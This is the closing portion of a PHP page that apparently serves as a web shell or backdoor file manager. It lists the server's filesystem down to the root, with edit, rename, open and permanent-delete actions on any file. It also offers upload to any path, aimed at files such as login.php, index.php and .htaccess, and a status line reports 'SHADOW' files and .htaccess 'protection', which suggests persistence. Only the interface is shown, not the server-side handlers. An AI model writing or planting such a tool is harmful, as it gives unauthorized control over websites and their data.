                            if ($current_path !== $document_root && $current_path !== '/' && $current_path !== 'C:/') {
                                $parent = dirname($current_path);
                                echo '<div class="file-item">';
                                echo '<div class="file-icon">📁</div>';
                                echo '<div class="file-name"><span class="clickable" onclick="gotoPath(\'' . htmlspecialchars($parent) . '\')">..</span></div>';
                                echo '<div class="file-actions"></div>';
                                echo '</div>';
                            }
                            
                            foreach ($files as $file) {
                                $file_path = $current_path . '/' . $file;
                                $is_dir = is_dir($file_path);
                                $perms = substr(sprintf('%o', fileperms($file_path)), -4);
                                ?>
                                <div class="file-item">
                                    <div class="file-icon"><?php echo $is_dir ? '📁' : '📄'; ?></div>
                                    <div class="file-name">
                                        <?php if ($is_dir): ?>
                                            <span class="clickable" onclick="gotoPath('<?php echo htmlspecialchars($file_path); ?>')"><?php echo htmlspecialchars($file); ?></span>
                                        <?php else: ?>
                                            <?php echo htmlspecialchars($file); ?>
                                        <?php endif; ?>
                                        <div style="font-size:0.7em; color:#666666;"><?php echo $perms; ?></div>
                                    </div>
                                    <div class="file-actions">
                                        <?php if (!$is_dir): ?>
                                            <a href="?edit_file=<?php echo urlencode($file_path); ?>" class="file-action" title="Edit">📝</a>
                                            <a href="?rename=<?php echo urlencode($file_path); ?>" class="file-action" title="Rename">✏️</a>
                                            <a href="?open_file=<?php echo urlencode($file_path); ?>" class="file-action" title="Open in Browser" target="_blank">🔗</a>
                                            <a href="?delete=<?php echo urlencode($file_path); ?>" class="file-action" title="Permanent Delete" onclick="return confirm('⚠️ PERMANENT DELETE?\n\nThis cannot be undone!')">🗑️</a>
                                        <?php else: ?>
                                            <a href="?rename=<?php echo urlencode($file_path); ?>" class="file-action" title="Rename">✏️</a>
                                            <a href="?delete=<?php echo urlencode($file_path); ?>" class="file-action" title="Delete Directory" onclick="return confirm('⚠️ PERMANENT DELETE DIRECTORY?\n\nThis cannot be undone!')">🗑️</a>
                                        <?php endif; ?>
                                    </div>
                                </div>
                                <?php
                            }
                        }
                    }
                    ?>
                </div>
            </div>
            
            <div class="section" id="uploadForm" style="display: none;">
                <form method="POST" action="" enctype="multipart/form-data">
                    <div style="margin-bottom:15px;">
                        <div style="font-size:0.9em; margin-bottom:5px; font-weight:600;">📁 UPLOAD PATH:</div>
                        <input type="text" name="upload_path" class="input" value="<?php echo htmlspecialchars($current_path); ?>" placeholder="Enter full path">
                        <div class="path-hint">💡 Allowed files: abouts.php, events.php, index.php, login.php, logout.php, codex.html, index.html, solvers.txt, .htaccess</div>
                    </div>
                    
                    <div style="margin-bottom:15px;">
                        <div style="font-size:0.9em; margin-bottom:5px; font-weight:600;">📄 SELECT FILE:</div>
                        <input type="file" name="upload_file" class="input" required>
                    </div>
                    
                    <div class="button-row">
                        <button type="button" onclick="hideUpload()" class="btn">CANCEL</button>
                        <button type="submit" class="btn">UPLOAD</button>
                    </div>
                </form>
            </div>
            
            <?php if (isset($_GET['edit']) && isset($_SESSION['edit_file'])): ?>
                <div class="section">
                    <form method="POST" action="">
                        <input type="hidden" name="file_path" value="<?php echo htmlspecialchars($_SESSION['edit_file']); ?>">
                        <textarea name="file_content" class="input" rows="15" style="font-family:monospace;"><?php echo isset($_SESSION['edit_content']) ? htmlspecialchars($_SESSION['edit_content']) : ''; unset($_SESSION['edit_file'], $_SESSION['edit_content']); ?></textarea>
                        <div class="button-row">
                            <button type="button" onclick="window.location.href=window.location.pathname" class="btn">CANCEL</button>
                            <button type="submit" name="save_file" class="btn">SAVE</button>
                        </div>
                    </form>
                </div>
            <?php endif; ?>
            
            <div class="status">
                <div>Path: <?php echo htmlspecialchars(basename($current_path)); ?></div>
                <div>UPLOAD: <?php echo $upload_allowed ? 'ALLOWED' : 'BLOCKED'; ?></div>
                <?php if ($protection_active): ?>
                <div>SHADOW: <?php echo count($shadow_status); ?> FILES</div>
                <?php else: ?>
                <div>CLEAN: NO .HTACCESS</div>
                <?php endif; ?>
            </div>
        <?php endif; ?>
    </div>

    <script>
        function gotoPath(path) { 
            window.location.href = '?goto_path=' + encodeURIComponent(path); 
        }
        
        function showUpload() { 
            document.getElementById('uploadForm').style.display = 'block'; 
        }
        
        function hideUpload() { 
            document.getElementById('uploadForm').style.display = 'none'; 
        }
        
        function togglePermissionsForm() { 
            var form = document.getElementById('permissionsForm');
            if (form.style.display === 'none' || form.style.display === '') {
                form.style.display = 'block';
            } else {
                form.style.display = 'none';
            }
        }
    </script>
</body>
</html>